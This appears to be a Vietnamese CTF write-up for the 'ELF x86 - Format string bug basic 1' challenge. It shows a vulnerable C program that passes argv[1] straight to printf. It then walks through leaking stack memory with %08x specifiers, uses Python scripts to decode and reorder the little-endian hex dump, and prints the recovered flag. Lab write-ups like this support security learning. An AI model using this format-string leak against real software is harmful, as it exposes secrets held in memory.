---
cover: ../../.gitbook/assets/image.png
coverY: 0
---

# 🎰 App - System

Note : A JOURNEY TO GAIN KNOWLEDGE

## ELF x86 - Format string bug basic 1

chall:

```
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

Work flow:

* Đầu tiên ta xác định được buffer size 32
* Flag được đọc từ file .passwd được chuyển thành string và ghi vào stack
* Hàm trigger đáng ngờ ở đây chính là printf với argv\[1]
* Thật vậy, khi đọc tài liệu về hàm printf ta thấy điều thú vị sau:

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* Như vậy tham số đầu tiên luôn là kiểu dữ liệu như %d, %s tương ứng với giá trị theo sau đó
* Nhưng ở đây lại truyền vào hàm printf với các giá trị không kiểm duyệt, dẫn đến hiện trạng nếu ta nhập các kiểu dữ liệu hex %x sẽ khiến hàm trả về các địa chỉ trong stack

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

*   Để dễ quan sát hơn ta dùng %0x.

    * 0 là padding khi không đủ số lượng
    * 8 là số lượng giá trị hiển thị
    * x là hiển thị giá trị x
    * và kí tụ . để phân cách mỗi 8 kí tự cho dễ quan sát



    <figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
* Như vậy ý tưởng ở đây, ta chỉ việc leak hết các dữ liệu có thể đọc trong stack và tìm cụm có nghĩa

```
from pwn import *
hex_val = "00000020.0804b160.0804853d.00000009.bffffcc9.b7e1b679.bffffb94.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffb94.bffffba0.f3004700.bffffb00.00000000.00000000.b7e03fa1.b7fc3000.b7fc3000.00000000.b7e03fa1.00000002.bffffb94.bffffba0.bffffb24.00000001"

list_hex = list(hex_val.split("."))

for x in list_hex:
        print(bytes.fromhex(x).decode(errors="ignore"),end="")
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Tuy nhiên do đang ở dạng little-endian, ta có thể viết đoạn script cơ bản sau để chuyển lại big-endian

```
from pwn import *
hex_val = "00000020.0804b160.0804853d.00000009.bffffcc9.b7e1b679.bffffb94.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffb94.bffffba0.f3004700.bffffb00.00000000.00000000.b7e03fa1.b7fc3000.b7fc3000.00000000.b7e03fa1.00000002.bffffb94.bffffba0.bffffb24.00000001"

list_hex = list(hex_val.split("."))
s = []

for y in list_hex:
    little_endian = y[6:] + y[4:-2] + y[2:-4] + y[0:-6]
    s.append(little_endian)
#print(s)
for x in s:
        print(bytes.fromhex(x).decode(errors="ignore"),end="")

```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

> flag: **Dpa9d6)(Epamd**

